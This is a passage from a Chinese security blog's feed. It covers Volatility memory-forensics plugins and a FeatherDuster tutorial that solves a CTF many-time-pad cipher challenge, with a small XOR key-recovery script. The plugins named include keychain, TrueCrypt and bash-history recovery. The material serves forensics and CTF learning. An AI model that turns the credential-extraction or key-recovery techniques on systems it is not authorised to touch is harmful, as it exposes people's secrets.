table</span><br><span class="line">mac_bash                   - Recover bash history from bash process memory</span><br><span class="line">mac_bash_env               - Recover bash&apos;s environment variables</span><br><span class="line">mac_bash_hash              - Recover bash hash table from bash process memory</span><br><span class="line">mac_calendar               - Gets calendar events from Calendar.app</span><br><span class="line">mac_check_fop              - Validate File Operation Pointers</span><br><span class="line">mac_check_mig_table        - Lists entires in the kernel&apos;s MIG table</span><br><span class="line">mac_check_syscall_shadow   - Looks for shadow system call tables</span><br><span class="line">mac_check_syscalls         - Checks to see if system call table entries are hooked</span><br><span class="line">mac_check_sysctl           - Checks for unknown sysctl handlers</span><br><span class="line">mac_check_trap_table       - Checks to see if mach trap table entries are hooked</span><br><span class="line">mac_compressed_swap        - Prints Mac OS X VM compressor stats and dumps all compressed pages</span><br><span class="line">mac_contacts               - Gets contact names from Contacts.app</span><br><span class="line">mac_dead_procs             - Prints terminated/de-allocated processes</span><br><span class="line">mac_dead_sockets           - Prints terminated/de-allocated network sockets</span><br><span class="line">mac_dead_vnodes            - Lists freed vnode structures</span><br><span class="line">mac_devfs                  - Lists files in the file cache</span><br><span class="line">mac_dmesg                  - Prints the kernel debug buffer</span><br><span class="line">mac_dump_file              - Dumps a specified file</span><br><span class="line">mac_dump_maps              - Dumps memory ranges of process(es), optionally including pages in compressed swap</span><br><span class="line">mac_dyld_maps              - Gets memory maps of processes from dyld data structures</span><br><span class="line">mac_find_aslr_shift        - Find the ASLR shift value for 10.8+ images</span><br><span class="line">mac_get_profile            - Automatically detect Mac profiles</span><br><span class="line">mac_ifconfig               - Lists network interface information for all devices</span><br><span class="line">mac_interest_handlers      - Lists IOKit Interest Handlers</span><br><span class="line">mac_ip_filters             - Reports any hooked IP filters</span><br><span class="line">mac_kernel_classes         - Lists loaded c++ classes in the kernel</span><br><span class="line">mac_kevents                - Show parent/child relationship of processes</span><br><span class="line">mac_keychaindump           - Recovers possbile keychain keys. Use chainbreaker to open related keychain files</span><br><span class="line">mac_ldrmodules             - Compares the output of proc maps with the list of libraries from libdl</span><br><span class="line">mac_librarydump            - Dumps the executable of a process</span><br><span class="line">mac_list_files             - Lists files in the file cache</span><br><span class="line">mac_list_kauth_listeners   - Lists Kauth Scope listeners</span><br><span class="line">mac_list_kauth_scopes      - Lists Kauth Scopes and their status</span><br><span class="line">mac_list_raw               - List applications with promiscuous sockets</span><br><span class="line">mac_list_sessions          - Enumerates sessions</span><br><span class="line">mac_list_zones             - Prints active zones</span><br><span class="line">mac_lsmod                  - Lists loaded kernel modules</span><br><span class="line">mac_lsmod_iokit            - Lists loaded kernel modules through IOkit</span><br><span class="line">mac_lsmod_kext_map         - Lists loaded kernel modules</span><br><span class="line">mac_lsof                   - Lists per-process opened files</span><br><span class="line">mac_machine_info           - Prints machine information about the sample</span><br><span class="line">mac_malfind                - Looks for suspicious process mappings</span><br><span class="line">mac_memdump                - Dump addressable memory pages to a file</span><br><span class="line">mac_moddump                - Writes the specified kernel extension to disk</span><br><span class="line">mac_mount                  - Prints mounted device information</span><br><span class="line">mac_netstat                - Lists active per-process network connections</span><br><span class="line">mac_network_conns          - Lists network connections from kernel network structures</span><br><span class="line">mac_notesapp               - Finds contents of Notes messages</span><br><span class="line">mac_notifiers              - Detects rootkits that add hooks into I/O Kit (e.g. LogKext)</span><br><span class="line">mac_orphan_threads         - Lists threads that don&apos;t map back to known modules/processes</span><br><span class="line">mac_pgrp_hash_table        - Walks the process group hash table</span><br><span class="line">mac_pid_hash_table         - Walks the pid hash table</span><br><span class="line">mac_print_boot_cmdline     - Prints kernel boot arguments</span><br><span class="line">mac_proc_maps              - Gets memory maps of processes</span><br><span class="line">mac_procdump               - Dumps the executable of a process</span><br><span class="line">mac_psaux                  - Prints processes with arguments in user land (**argv)</span><br><span class="line">mac_psenv                  - Prints processes with environment in user land (**envp)</span><br><span class="line">mac_pslist                 - List Running Processes</span><br><span class="line">mac_pstree                 - Show parent/child relationship of processes</span><br><span class="line">mac_psxview                - Find hidden processes with various process listings</span><br><span class="line">mac_recover_filesystem     - Recover the cached filesystem</span><br><span class="line">mac_route                  - Prints the routing table</span><br><span class="line">mac_socket_filters         - Reports socket filters</span><br><span class="line">mac_strings                - Match physical offsets to virtual addresses (may take a while, VERY verbose)</span><br><span class="line">mac_tasks                  - List Active Tasks</span><br><span class="line">mac_threads                - List Process Threads</span><br><span class="line">mac_threads_simple         - Lists threads along with their start time and priority</span><br><span class="line">mac_timers                 - Reports timers set by kernel drivers</span><br><span class="line">mac_trustedbsd             - Lists malicious trustedbsd policies</span><br><span class="line">mac_version                - Prints the Mac version</span><br><span class="line">mac_vfsevents              - Lists processes filtering file system events</span><br><span class="line">mac_volshell               - Shell in the memory image</span><br><span class="line">mac_yarascan               - Scan memory for yara signatures</span><br><span class="line">machoinfo                  - Dump Mach-O file format information</span><br><span class="line">malfind                    - Find hidden and injected code</span><br><span class="line">mbrparser                  - Scans for and parses potential Master Boot Records (MBRs)</span><br><span class="line">memdump                    - Dump the addressable memory for a process</span><br><span class="line">memmap                     - Print the memory map</span><br><span class="line">messagehooks               - List desktop and thread window message hooks</span><br><span class="line">mftparser                  - Scans for and parses potential MFT entries</span><br><span class="line">moddump                    - Dump a kernel driver to an executable file sample</span><br><span class="line">modscan                    - Pool scanner for kernel modules</span><br><span class="line">modules                    - Print list of loaded modules</span><br><span class="line">multiscan                  - Scan for various objects at once</span><br><span class="line">mutantscan                 - Pool scanner for mutex objects</span><br><span class="line">netscan                    - Scan a Vista (or later) image for connections and sockets</span><br><span class="line">notepad                    - List currently displayed notepad text</span><br><span class="line">objtypescan                - Scan for Windows object type objects</span><br><span class="line">patcher                    - Patches memory based on page scans</span><br><span class="line">poolpeek                   - Configurable pool scanner plugin</span><br><span class="line">pooltracker                - Show a summary of pool tag usage</span><br><span class="line">printkey                   - Print a registry key, and its subkeys and values</span><br><span class="line">privs                      - Display process privileges</span><br><span class="line">procdump                   - Dump a process to an executable file sample</span><br><span class="line">pslist                     - Print all running processes by following the EPROCESS lists</span><br><span class="line">psscan                     - Pool scanner for process objects</span><br><span class="line">pstree                     - Print process list as a tree</span><br><span class="line">psxview                    - Find hidden processes with various process listings</span><br><span class="line">qemuinfo                   - Dump Qemu information</span><br><span class="line">raw2dmp                    - Converts a physical memory sample to a windbg crash dump</span><br><span class="line">screenshot                 - Save a pseudo-screenshot based on GDI windows</span><br><span class="line">servicediff                - List Windows services (ala Plugx)</span><br><span class="line">sessions                   - List details on _MM_SESSION_SPACE (user logon sessions)</span><br><span class="line">shellbags                  - Prints ShellBags info</span><br><span class="line">shimcache                  - Parses the Application Compatibility Shim Cache registry key</span><br><span class="line">shutdowntime               - Print ShutdownTime of machine from registry</span><br><span class="line">sockets                    - Print list of open sockets</span><br><span class="line">sockscan                   - Pool scanner for tcp socket objects</span><br><span class="line">ssdt                       - Display SSDT entries</span><br><span class="line">strings                    - Match physical offsets to virtual addresses (may take a while, VERY verbose)</span><br><span class="line">svcscan                    - Scan for Windows services</span><br><span class="line">symlinkscan                - Pool scanner for symlink objects</span><br><span class="line">thrdscan                   - Pool scanner for thread objects</span><br><span class="line">threads                    - Investigate _ETHREAD and _KTHREADs</span><br><span class="line">timeliner                  - Creates a timeline from various artifacts in memory</span><br><span class="line">timers                     - Print kernel timers and associated module DPCs</span><br><span class="line">truecryptmaster            - Recover TrueCrypt 7.1a Master Keys</span><br><span class="line">truecryptpassphrase        - TrueCrypt Cached Passphrase Finder</span><br><span class="line">truecryptsummary           - TrueCrypt Summary</span><br><span class="line">unloadedmodules            - Print list of unloaded modules</span><br><span class="line">userassist                 - Print userassist registry keys and information</span><br><span class="line">userhandles                - Dump the USER handle tables</span><br><span class="line">vaddump                    - Dumps out the vad sections to a file</span><br><span class="line">vadinfo                    - Dump the VAD info</span><br><span class="line">vadtree                    - Walk the VAD tree and display in tree format</span><br><span class="line">vadwalk                    - Walk the VAD tree</span><br><span class="line">vboxinfo                   - Dump virtualbox information</span><br><span class="line">verinfo                    - Prints out the version information from PE images</span><br><span class="line">vmwareinfo                 - Dump VMware VMSS/VMSN information</span><br><span class="line">volshell                   - Shell in the memory image</span><br><span class="line">win10cookie                - Find the ObHeaderCookie value for Windows 10</span><br><span class="line">windows                    - Print Desktop Windows (verbose details)</span><br><span class="line">wintree                    - Print Z-Order Desktop Windows Tree</span><br><span class="line">wndscan                    - Pool scanner for window stations</span><br><span class="line">yarascan                   - Scan process or kernel memory with Yara signatures</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://github.com/volatilityfoundation/volatility&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;volatility&lt;/a&gt; 是一款内存取证和分析工具，可以对 Procdump 等工具 
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.restran.net/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://www.restran.net/tags/CTF/"/>
    
      <category term="取证分析" scheme="http://www.restran.net/tags/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/"/>
    
      <category term="内存取证" scheme="http://www.restran.net/tags/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>密码学分析和破解工具 FeatherDuster 使用说明</title>
    <link href="http://www.restran.net/2017/08/10/crypto-analyze-tool-feather-duster/"/>
    <id>http://www.restran.net/2017/08/10/crypto-analyze-tool-feather-duster/</id>
    <published>2017-08-09T16:00:00.000Z</published>
    <updated>2017-08-10T00:45:38.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/nccgroup/featherduster" target="_blank" rel="noopener">FeatherDuster</a> 是一个 Python开发的用于分析密文和破解加密的框架，它试图让识别和利用弱密码系统尽可能的简单。不支持 Windows，而且需要 Python 2.x 环境。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>无法通过 pip 安装，需要先从 Github 上下载代码安装</p><p>安装依赖</p><pre><code>apt-get install python-crypto, libncurses-dev, libgmp3-dev</code></pre><p>进入 featherduster 目录后，直接安装</p><pre><code>python setup.py install</code></pre><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>在命令行中输入 featherduster，就可以进入交互模式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">FeatherDuster&gt; </span><br><span class="line">Help:</span><br><span class="line">        analyze - Analyze/decode samples</span><br><span class="line">        autopwn - Analyze samples and run all attacks</span><br><span class="line">        console - Opens an interactive prompt</span><br><span class="line">         export - Export current results to file</span><br><span class="line">         import - Import samples for analysis</span><br><span class="line">        modules - Show all available modules</span><br><span class="line">        options - Show the current option values</span><br><span class="line">        results - Show the results from the last module run</span><br><span class="line">            run - Run the currently selected module</span><br><span class="line">        samples - Show samples</span><br><span class="line">         search - Search module names and descriptions by keyword</span><br><span class="line">            set - Set an option (i.e., &quot;set num_answers=3&quot;</span><br><span class="line">          unset - Revert an option to its default value</span><br><span class="line">            use - Select the module to use</span><br></pre></td></tr></table></figure><p>在分析之前，需要先导入样本（也就是待分析和破解的密文），如果只有一个样本文件，可以直接 <code>featherduster sample.txt</code> 然后进入到交互模式，如果是较多的样本，则需要用 import 指令导入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 从文件中载入一个样本，输入后根据提示输入文件名</span><br><span class="line">import singlefile</span><br><span class="line"># 从文件中载入多个样本，每行一个样本，输入后根据提示输入文件名</span><br><span class="line">import multifile</span><br><span class="line"># 清除所有的样本</span><br><span class="line">import clear</span><br><span class="line"># 查看导入的样本</span><br><span class="line">samples</span><br></pre></td></tr></table></figure><p><a href="https://github.com/ctfs/write-ups-2017/tree/master/alexctf-2017/cryptography/cr2-many-time-secrets-100" target="_blank" rel="noopener">alexctf-2017</a> 有一题是用到了 Many Time Pad 流密码，可以使用 FeatherDuster 快速破解。</p><p>分析样本</p><pre><code>analyze</code></pre><p>对 alexctf-2017 的这道题目，使用 analyze 后会给出很多的建议模块，根据题干，可以知道是使用 many_time_pad 进行破解。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[+] Suggested modules:</span><br><span class="line">   alpha_shift          - A brute force attack against an alphabetic shift cipher. </span><br><span class="line">   base_n_solver        - A solver for silly base-N encoding obfuscation.          </span><br><span class="line">   single_byte_xor      - A brute force attack against single-byte XOR encrypted ciphertext.</span><br><span class="line">   multi_byte_xor       - A brute force attack against multi-byte XOR encrypted ciphertext.</span><br><span class="line">   many_time_pad        - A statistical attack against keystream reuse in various stream ciphers, and the one-time pad.</span><br><span class="line">   vigenere             - A module to break vigenere ciphers using index of coincidence for key length detection and frequency analysis.</span><br></pre></td></tr></table></figure><p>根据分析的结果，载入指定的模块，进行破解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># use 命令可以载入指定模块，用 tab 键可以自动补全，这里是载入 many_time_pad</span><br><span class="line">use many_time_pad</span><br><span class="line"># 如果不记得模块的名称，可以使用 search 指令按名称或描述搜索</span><br><span class="line">search your_keyword</span><br></pre></td></tr></table></figure><p>使用上述指定的模块进行破解</p><pre><code>run</code></pre><p>查看结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 查看结果</span><br><span class="line">results </span><br><span class="line"># 导出结果到文件，输入后根据提示输入文件名</span><br><span class="line">export</span><br></pre></td></tr></table></figure><p>破解后的结果是这样的，但是这道题目的 flag 其实是 Many Time Pad 加密的 key，因此还需要手动处理一下。现在已经知道了密文对应的明文，只需要选择一行对密文和明文异或一下就能得到 key。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">FeatherDuster&gt; results </span><br><span class="line">Last results (long values may be truncated):</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0: &apos;Edvc Fri1nr, Tnie tome I u&apos;                                </span><br><span class="line">1: &apos;oercstoo0 &#123;y mosbakc and u&apos;                                </span><br><span class="line">2: &apos;rds1One  i&#123;e pgd6eneryptio&apos;                                </span><br><span class="line">3: &apos;o!drhemex _ hegrr tnat it &apos;                                </span><br><span class="line">4: &apos;hr7ehe o:lo eneroptoon met&apos;                                </span><br><span class="line">5: &apos;ins1thattie marhsmarically&apos;                                </span><br><span class="line">6: &apos;!qe~ven  o6be hob ctacked &apos;                                </span><br><span class="line">7: &apos;dwrc if  hs ke\x7f \x7fs mept se&apos;                          </span><br><span class="line">8: &apos;btet, Le  [e khoa i` you a&apos;                                </span><br><span class="line">9: &apos;fsrt wit&lt; &#123;e ti cse&amp;this e&apos;                                </span><br><span class="line">10: &apos;obehptio: echeke6alqays.&apos;</span><br></pre></td></tr></table></figure><p>使用异或还原出 Many Time Pad  的 key </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># XORs two string</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b''</span>.join([chr(ord(x) ^ ord(y)) <span class="keyword">for</span> (x, y) <span class="keyword">in</span> zip(a, b)])</span><br><span class="line"></span><br><span class="line">key = str_xor(target_cipher.decode(<span class="string">'hex'</span>), target_plaintext)</span><br></pre></td></tr></table></figure><p>如果没有什么思路，可以用暴力破解的方式。这个命令会自动分析样本，并用所有的攻击方式暴力破解。</p><pre><code>autopwn </code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://github.com/nccgroup/featherduster&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;FeatherDuster&lt;/a&gt; 是一个 Python开发的用于分析密文和破解加密的框架，它试图让识别和利
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.restran.net/categories/CTF/"/>
    
    
      <category term="Python" scheme="http://www.restran.net/tags/Python/"/>
    
      <category term="CTF" scheme="http://www.restran.net/tags/CTF/"/>
    
      <category term="密码学" scheme="http://www.restran.net/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
</feed>
